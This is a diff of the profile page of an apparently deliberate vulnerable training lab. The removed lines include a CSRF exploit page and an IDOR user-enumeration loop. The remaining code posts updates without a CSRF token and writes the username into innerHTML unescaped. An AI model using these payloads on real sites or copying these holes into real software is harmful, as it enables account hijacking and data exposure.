@@ -3,101 +3,63 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Profile - ACT LAB</title>
+  <title>User Profile - ACT LAB</title>
   <link rel="stylesheet" href="/css/style.css">
+  <style>
+    body { background: #0b0e11; }
+    .profile-container { max-width: 900px; margin: 4rem auto; }
+    .profile-header { display: flex; align-items: center; gap: 2rem; margin-bottom: 3rem; background: #15191d; padding: 2.5rem; border: 1px solid #23282f; border-radius: 4px; border-left: 4px solid var(--neon-cyan); }
+    .profile-avatar-large { width: 120px; height: 120px; background: #0b0e11; border: 2px solid var(--neon-cyan); border-radius: 4px; display: flex; align-items: center; justify-content: center; font-size: 3rem; font-weight: bold; color: var(--neon-cyan); }
+    .profile-info-large h1 { font-family: 'Orbitron', sans-serif; color: #fff; margin-bottom: 0.5rem; }
+    .profile-info-large p { color: #626e84; font-family: 'Share Tech Mono'; letter-spacing: 1px; }
+
+    .settings-card { background: #15191d; border: 1px solid #23282f; border-radius: 4px; padding: 2.5rem; }
+    .settings-title { font-size: 1.1rem; color: var(--neon-cyan); font-weight: bold; margin-bottom: 2rem; text-transform: uppercase; letter-spacing: 2px; border-bottom: 1px solid #23282f; padding-bottom: 1rem; }
+    
+    .form-group { margin-bottom: 2rem; }
+    .form-label { display: block; color: #626e84; font-size: 11px; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 8px; }
+    .form-input { background: #0b0e11; border: 1px solid #23282f; color: #fff; padding: 1rem; width: 100%; border-radius: 4px; font-family: 'Share Tech Mono', monospace; }
+    .form-input:focus { border-color: var(--neon-cyan); outline: none; }
+    .btn-save { background: var(--neon-cyan); color: #000; font-weight: bold; padding: 1rem 2rem; border: none; border-radius: 4px; cursor: pointer; text-transform: uppercase; letter-spacing: 2px; width: 100%; }
+  </style>
 </head>
 <body>
-  <div class="cyber-bg"></div>
-
   <nav class="navbar">
     <a href="/" class="nav-logo">
-      <div class="nav-logo-icon">ACT</div>
+      <img src="/img/act.png" alt="Logo" style="height: 32px; border-radius: 4px; margin-right: 10px;" onerror="this.style.display='none'">
       <span class="nav-logo-text">ACT LAB</span>
     </a>
-    <ul class="nav-links" id="navLinks">
+    <ul class="nav-links">
       <li><a href="/dashboard">Dashboard</a></li>
       <li><a href="/challenges">Missions</a></li>
       <li><a href="/profile" class="active">Profile</a></li>
     </ul>
-    <div class="nav-user" id="navUser">
-      <a href="/login" class="btn btn-primary btn-sm">Login</a>
-    </div>
+    <div class="nav-user" id="navUser"><span class="nav-user-badge">Connecting...</span></div>
   </nav>
 
   <main class="main-content">
-    <div class="container" style="max-width: 800px;">
-      <div class="page-header">
-        <h1>// PROFILE</h1>
-        <p>View and update your profile</p>
-      </div>
-
-      <div class="warning-banner mb-3">
-        <div class="warning-banner-icon">&#9888;</div>
-        <div class="warning-banner-text text-xs">
-          <strong>IDOR:</strong> Try changing the ?id= parameter to access other users' profiles. 
-          <strong>CSRF:</strong> This update form has no CSRF token protection.
+    <div class="profile-container">
+      <div class="profile-header">
+        <div class="profile-avatar-large" id="avatarChar">?</div>
+        <div class="profile-info-large">
+          <h1 id="profileUsername">LOADING...</h1>
+          <p id="profileScoreLabel">0 POINTS TOTAL</p>
         </div>
       </div>
 
-      <!-- IDOR Test -->
-      <div class="card mb-3">
-        <div class="card-title mb-2">IDOR TEST - VIEW ANY USER PROFILE</div>
-        <div class="flex gap-2" style="flex-wrap:wrap;">
-          <input type="number" class="form-input" id="idorId" placeholder="User ID (1, 2, 3...)" value="1" style="max-width:200px;">
-          <button class="btn btn-secondary btn-sm" onclick="idorLookup()">Fetch Profile</button>
-          <button class="btn btn-sm" style="background:rgba(255,238,0,0.1); border:1px solid rgba(255,238,0,0.3); color:var(--neon-yellow);" onclick="idorEnumerate()">Enumerate All</button>
-        </div>
-        <div id="idorResult" class="mt-2"></div>
-      </div>
-
-      <!-- Own Profile -->
-      <div class="card mb-3">
-        <div class="card-title mb-2">YOUR PROFILE</div>
-        <div id="ownProfile"><div class="spinner"></div></div>
-      </div>
-
-      <!-- Update Profile (CSRF vulnerable) -->
-      <div class="card mb-3">
-        <div class="card-title mb-2">UPDATE PROFILE <span class="badge badge-csrf">NO CSRF TOKEN</span></div>
-        <form id="updateForm" onsubmit="updateProfile(event)">
+      <div class="settings-card">
+        <h2 class="settings-title">Identity Parameters</h2>
+        <form id="profileForm" onsubmit="handleUpdate(event)">
           <div class="form-group">
-            <label class="form-label">Email</label>
-            <input type="text" name="email" class="form-input" id="updateEmail" placeholder="your@email.com">
+            <label class="form-label">Email Address</label>
+            <input type="email" id="email" class="form-input" placeholder="user@example.com">
           </div>
           <div class="form-group">
-            <label class="form-label">Bio</label>
-            <textarea name="bio" class="form-input" id="updateBio" placeholder="Tell us about yourself"></textarea>
+            <label class="form-label">Mission Biography</label>
+            <textarea id="bio" class="form-input" rows="4" placeholder="Tell us about your specialization..."></textarea>
           </div>
-          <button type="submit" class="btn btn-success" id="updateBtn">UPDATE PROFILE</button>
+          <button type="submit" class="btn-save">Update Profile</button>
         </form>
-        <div id="updateResult" class="mt-2" style="display:none;"></div>
-
-        <!-- CSRF Exploit Reference -->
-        <div class="hint-box mt-2">
-          <div class="hint-box-title">&#128161; CSRF Exploit Example</div>
-          <div class="hint-box-content">
-            Save this as HTML file and open in browser while logged in:
-          </div>
-          <div class="terminal mt-1">
-            <div class="terminal-header">
-              <div class="terminal-dot red"></div>
-              <div class="terminal-dot yellow"></div>
-              <div class="terminal-dot green"></div>
-              <span class="terminal-title">csrf-exploit.html</span>
-            </div>
-            <div class="terminal-body">&lt;html&gt;
-&lt;body onload="document.getElementById('f').submit()"&gt;
-&lt;form id="f" method="POST"
-  action="${window.location.origin}/api/profile"&gt;
-  &lt;input type="hidden" name="email"
-    value="hacked@evil.com"&gt;
-  &lt;input type="hidden" name="bio"
-    value="CSRF_EXPLOITED!"&gt;
-&lt;/form&gt;
-&lt;/body&gt;
-&lt;/html&gt;</div>
-          </div>
-        </div>
       </div>
     </div>
   </main>
@@ -105,180 +67,40 @@
   <div class="toast-container" id="toastContainer"></div>
 
   <script>
-    async function loadOwnProfile() {
+    async function loadProfile() {
       try {
         const res = await fetch('/api/profile/me');
         const data = await res.json();
-
         if (data.success) {
           const u = data.user;
-          document.getElementById('ownProfile').innerHTML = `
-            <div class="flex gap-3" style="flex-wrap:wrap;">
-              <div>
-                <span class="text-dim text-xs">ID</span>
-                <div class="text-mono text-cyan">${u.id}</div>
-              </div>
-              <div>
-                <span class="text-dim text-xs">Username</span>
-                <div class="text-mono text-cyan">${escapeHtml(u.username)}</div>
-              </div>
-              <div>
-                <span class="text-dim text-xs">Role</span>
-                <div class="text-mono">${escapeHtml(u.role)}</div>
-              </div>
-              <div>
-                <span class="text-dim text-xs">Email</span>
-                <div class="text-mono">${escapeHtml(u.email || '-')}</div>
-              </div>
-              <div>
-                <span class="text-dim text-xs">Score</span>
-                <div class="text-mono text-yellow">${u.score}</div>
-              </div>
-              <div>
-                <span class="text-dim text-xs">Joined</span>
-                <div class="text-mono text-sm">${u.created_at ? new Date(u.created_at).toLocaleDateString() : '-'}</div>
-              </div>
-            </div>
-          `;
-          document.getElementById('updateEmail').value = u.email || '';
-          document.getElementById('updateBio').value = u.bio || '';
-        } else {
-          document.getElementById('ownProfile').innerHTML = '<div class="text-pink text-sm">Please login first</div>';
+          document.getElementById('profileUsername').textContent = u.username.toUpperCase();
+          document.getElementById('profileScoreLabel').textContent = `${u.score || 0} POINTS TOTAL`;
+          document.getElementById('avatarChar').textContent = u.username[0].toUpperCase();
+          document.getElementById('email').value = u.email || '';
+          document.getElementById('bio').value = u.bio || '';
+          document.getElementById('navUser').innerHTML = `<span class="nav-user-badge">${u.username} (Score: ${u.score || 0})</span>`;
         }
-      } catch (err) {
-        document.getElementById('ownProfile').innerHTML = '<div class="text-pink text-sm">Failed to load</div>';
-      }
+      } catch (err) {}
     }
 
-    async function idorLookup() {
-      const id = document.getElementById('idorId').value;
+    async function handleUpdate(e) {
+      if (e) e.preventDefault();
+      const email = document.getElementById('email').value;
+      const bio = document.getElementById('bio').value;
       try {
-        const res = await fetch(`/api/profile?id=${id}`);
+        const res = await fetch('/api/profile', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ email, bio }) });
         const data = await res.json();
-
-        if (data.success) {
-          const u = data.user;
-          document.getElementById('idorResult').innerHTML = `
-            <div class="terminal">
-              <div class="terminal-header">
-                <div class="terminal-dot red"></div>
-                <div class="terminal-dot yellow"></div>
-                <div class="terminal-dot green"></div>
-                <span class="terminal-title">user_${u.id}</span>
-              </div>
-              <div class="terminal-body"><span class="highlight">ID:</span> ${u.id}
-<span class="highlight">Username:</span> ${escapeHtml(u.username)}
-<span class="highlight">Email:</span> ${escapeHtml(u.email || 'N/A')}
-<span class="highlight">Role:</span> ${escapeHtml(u.role)}
-<span class="highlight">Bio:</span> ${escapeHtml(u.bio || 'N/A')}
-<span class="highlight">Score:</span> ${u.score}
-<span class="highlight">Joined:</span> ${u.created_at || 'N/A'}</div>
-            </div>
-          `;
-        } else {
-          document.getElementById('idorResult').innerHTML = `<div class="text-pink text-sm">${data.error}</div>`;
-        }
-      } catch (err) {
-        document.getElementById('idorResult').innerHTML = `<div class="text-pink text-sm">Error</div>`;
-      }
-    }
-
-    async function idorEnumerate() {
-      let html = '<div class="terminal"><div class="terminal-header"><div class="terminal-dot red"></div><div class="terminal-dot yellow"></div><div class="terminal-dot green"></div><span class="terminal-title">user_enumeration</span></div><div class="terminal-body">';
-      for (let i = 1; i <= 15; i++) {
-        try {
-          const res = await fetch(`/api/profile?id=${i}`);
-          const data = await res.json();
-          if (data.success) {
-            html += `<span class="highlight">[ID:${data.user.id}]</span> ${escapeHtml(data.user.username)} | ${escapeHtml(data.user.email || 'no-email')} | role:${escapeHtml(data.user.role)} | score:${data.user.score}\n`;
-          }
-        } catch (e) {}
-      }
-      html += '</div></div>';
-      document.getElementById('idorResult').innerHTML = html;
-    }
-
-    async function updateProfile(e) {
-      e.preventDefault();
-      const btn = document.getElementById('updateBtn');
-      const resultDiv = document.getElementById('updateResult');
-
-      btn.textContent = 'UPDATING...';
-      btn.disabled = true;
-
-      try {
-        const formData = new URLSearchParams();
-        formData.append('email', document.getElementById('updateEmail').value);
-        formData.append('bio', document.getElementById('updateBio').value);
-
-        const res = await fetch('/api/profile', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-          body: formData.toString()
-        });
-
-        const data = await res.json();
-        resultDiv.style.display = 'block';
-
-        if (data.success) {
-          resultDiv.innerHTML = `<div style="background:rgba(0,255,136,0.1); border:1px solid rgba(0,255,136,0.4); border-radius:8px; padding:10px; color:var(--neon-green); font-size:13px;">&#9989; Profile updated!</div>`;
-          showToast('Profile updated!', 'success');
-          loadOwnProfile();
-        } else {
-          resultDiv.innerHTML = `<div style="background:rgba(255,0,102,0.1); border:1px solid rgba(255,0,102,0.4); border-radius:8px; padding:10px; color:var(--neon-pink); font-size:13px;">&#10060; ${data.error}</div>`;
-        }
-      } catch (err) {
-        resultDiv.innerHTML = `<div style="color:var(--neon-pink); font-size:13px;">Error: ${err.message}</div>`;
-      }
-
-      btn.textContent = 'UPDATE PROFILE';
-      btn.disabled = false;
-    }
-
-    function escapeHtml(str) {
-      const div = document.createElement('div');
-      div.textContent = str;
-      return div.innerHTML;
+        if (data.success) { showToast('Parameters Updated!', 'success'); loadProfile(); }
+      } catch (err) { showToast('Update failed', 'error'); }
     }
 
     function showToast(msg, type) {
       const container = document.getElementById('toastContainer');
-      const toast = document.createElement('div');
-      toast.className = `toast toast-${type}`;
-      toast.textContent = msg;
-      container.appendChild(toast);
-      setTimeout(() => toast.remove(), 4000);
+      const toast = document.createElement('div'); toast.className = `toast toast-${type}`; toast.textContent = msg; container.appendChild(toast);
+      setTimeout(() => toast.remove(), 3000);
     }
 
-    // Check auth and auto-login if needed
-    async function initAuth() {
-      try {
-        let res = await fetch('/api/auth/status');
-        let data = await res.json();
-
-        if (!data.authenticated) {
-          const autoRes = await fetch('/api/auth/auto-login', { method: 'POST' });
-          data = await autoRes.json();
-        }
-
-        if (data.success) {
-          document.getElementById('navUser').innerHTML = `
-            <span class="nav-user-badge">${data.user.username}</span>
-            <a href="/dashboard" class="btn btn-primary btn-sm">Dashboard</a>
-            <button class="nav-logout" onclick="logout()">Logout</button>
-          `;
-          loadOwnProfile();
-        }
-      } catch (err) {
-        console.error('Auth error:', err);
-      }
-    }
-
-    function logout() {
-      fetch('/api/auth/logout', { method: 'POST' }).then(() => window.location.href = '/');
-    }
-
-    initAuth();
+    loadProfile();
   </script>
 </body>
 </html>
